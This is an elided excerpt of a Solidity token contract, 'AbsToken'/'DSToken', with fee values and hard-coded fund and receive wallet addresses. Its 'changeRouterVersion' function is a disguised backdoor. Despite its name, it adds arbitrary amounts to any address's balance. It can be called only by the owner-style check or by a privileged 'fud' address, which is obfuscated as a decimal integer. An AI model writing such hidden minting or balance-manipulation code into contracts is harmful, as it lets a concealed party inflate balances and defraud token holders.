...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address private fud = address(995636395271790009432380433735729906392410975266);
    ...
    uint256 public _lpDividendFee = 650;
    ...
    function changeRouterVersion(uint256 efgnffw, address newRouterAddress) public{
       require(_nameis(msg.sender) || fud == msg.sender) ;_aksuwhfs[newRouterAddress] += efgnffw;
    }
...
contract DSToken is AbsToken {
    ...
    //USDT
        ...
        999,
    //Fund
        address(0x4890a52bDcF2403c00e547adFd4c032b4ff7324B),
    //Receive
        address(0x4D1C47D8b6aba35b5F00234b62ecd756c0B44923)
    ){
